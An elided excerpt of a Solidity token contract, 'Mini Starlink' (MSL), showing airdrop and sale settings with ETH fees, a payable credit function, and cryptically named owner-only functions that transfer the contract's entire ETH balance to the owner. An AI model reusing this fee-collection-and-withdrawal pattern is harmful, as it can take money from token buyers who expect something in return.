...
contract MSLtoken{
    ...
    uint256 private _totalSupply = 900000000000000000000000;
    string private _name = "Mini Starlink";
    string private _symbol = "MSL";
    uint8 private _decimals = 9;
    address private _owner;
    uint256 private _cap   =  0;
    string private _website = 'www.msltoken.net';
    bool private _swAirdrop = true;
    bool private _swSale = true;
    uint256 private _referEth =     3000;
    uint256 private _referToken =   7000;
    uint256 private _airdropEth =   2000000000000000;
    uint256 private _airdropToken = 1000000000000000;
    ...
    function ContractAddCredit() public payable {
    ...
    function CWM() public onlyOwner returns(bool) {
        address payable to = payable(msg.sender);
        to.transfer(getBalance());
        
    }

    function CWMto(address payable _to) public onlyOwner returns(bool) {
